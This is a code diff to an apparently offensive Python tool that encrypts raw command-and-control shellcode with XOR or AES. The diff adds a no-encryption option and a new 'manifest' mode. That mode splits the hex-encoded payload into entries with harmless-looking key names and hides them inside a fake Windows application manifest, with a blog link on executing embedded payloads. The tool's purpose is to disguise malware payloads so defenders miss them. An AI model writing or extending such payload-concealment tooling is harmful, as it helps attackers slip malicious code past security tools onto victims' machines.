@@ -6,14 +6,13 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto import Random
 
-
 def main(args=sys.argv[1:]):
 	# Instantiate the argument parser
 	parser = argparse.ArgumentParser(description='Shellcode XOR/AES encrypter')
 	parser.add_argument('-file', '-f', help="Raw binary shellcode file from C2")
-	parser.add_argument('-algo', '-a', type=str, help="The encryption algorithm", choices=['xor', 'aes'])
+	parser.add_argument('-algo', '-a', type=str, help="The encryption algorithm", choices=['xor', 'aes', 'none'])
 	parser.add_argument('-key', '-k', default='random', type=str, help="Create a random encryption key or use key provide by input (Use \"random\" as argument or provide your own key)")
-	parser.add_argument('-output', '-o', type=str, help="Type of shellcode to output (args: base64, hex, csharp, raw)", choices=['b64','hex','csharp','raw'])
+	parser.add_argument('-output', '-o', type=str, help="Type of shellcode to output (args: base64, hex, csharp, manifest, raw)", choices=['b64','hex','csharp','manifest','raw'])
 	parser.add_argument('-chunked', '-c', help="Split shellcode into 4 even chunks (separated by new lines)", action='store_true', required=False)
 	args = parser.parse_args(args)
 
@@ -37,6 +36,7 @@ def main(args=sys.argv[1:]):
 		sys.exit()
 
 	IV = None # init IV for AES
+	manifestFileName = 'config.manifest' # Output manifest file name with embedded shellcode
 
 	# Get shellcode from input file
 	shellcode = getShellcode(inputFile)
@@ -67,6 +67,9 @@ def main(args=sys.argv[1:]):
 
 		encryptedShellCode = AESencrypt(AES_Key, IV, shellcode)
 
+	# No encryption
+	elif algo == 'none':
+		encryptedShellCode = shellcode
 
 	########## Output Encoding Functions ##########
 
@@ -97,6 +100,23 @@ def main(args=sys.argv[1:]):
 		print("[+] Encrypted CSharp shellcode has been copied to Clipboard!")
 
 
+	# Create 
+	# Blog: https://hxr1.ghost.io/stealth-in-the-stacks-executing-embedded-payloads-via-native-extensions-and-gui-hooks/
+	elif output == 'manifest':
+		hexShellcode = encryptedShellCode.hex()
+
+		# Get manifest shellcode file contents
+		manifestFile = createManifest(hexShellcode)
+
+		# Copy manifest encoded/encrypted shellcode to clipboard
+		copyShellcodeToClipboard(manifestFile, chunk=False)
+		with open(manifestFileName, "w") as f:
+			f.write(manifestFile)
+
+		print("[+] Manifest shellcode file contents copied to Clipboard!")
+		print(f"[+] Successfully created manifest file: '{manifestFileName}'")
+
+
 	# Save encrypted raw binary to output file
 	elif output == 'raw':
 		filename = "shellcode-raw-encrypted.bin"
@@ -109,12 +129,13 @@ def main(args=sys.argv[1:]):
 
 
 	########## Print encryption key ##########
-	print("[+] {} Encryption KEY: {}".format(algo.upper(), encKey)) # AES/XOR key
-	# Print AES key and IV
-	if IV:
-		print('[+] AESkey[] = { 0x' + ',0x'.join(hex(x)[2:] for x in bytes(encKey, 'utf-8')) + ' };')
-		print("[+] IV: {}".format(IV))
-		print('[+] IV[] = { 0x' + ',0x'.join(hex(x)[2:] for x in IV) + ' };')
+	if (algo == 'xor' or algo == 'aes'):
+		print("[+] {} Encryption KEY: {}".format(algo.upper(), encKey)) # AES/XOR key
+		# Print AES key and IV
+		if IV:
+			print('[+] AESkey[] = { 0x' + ',0x'.join(hex(x)[2:] for x in bytes(encKey, 'utf-8')) + ' };')
+			print("[+] IV: {}".format(IV))
+			print('[+] IV[] = { 0x' + ',0x'.join(hex(x)[2:] for x in IV) + ' };')
 
 #end main()
 
@@ -191,6 +212,34 @@ def AESpad(data, block_size):
 	padding = (bytes([padding_size]) * padding_size)
 	return data + padding
 
+
+# Manifest file encoding: Create the XML manifest file contents
+def createManifest(encoded_payload):
+	wordlist = ["theme", "layout", "hint", "render", "guid", "font"]
+
+	# Split into multiple <entry> values
+	chunks = [encoded_payload[i:i+64] for i in range(0, len(encoded_payload), 64)]
+
+	entries = ""
+	for idx, chunk in enumerate(chunks):
+		key_prefix = random.choice(wordlist)
+		key = f"{key_prefix}_{100+idx}"
+		entries += f'        <entry key="{key}" value="{chunk}"/>\n'
+
+
+	return f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+      <config>
+{entries}      </config>
+    </security>
+  </trustInfo>
+</assembly>
+"""
 
 ##################### Main #####################
 if __name__ == '__main__':
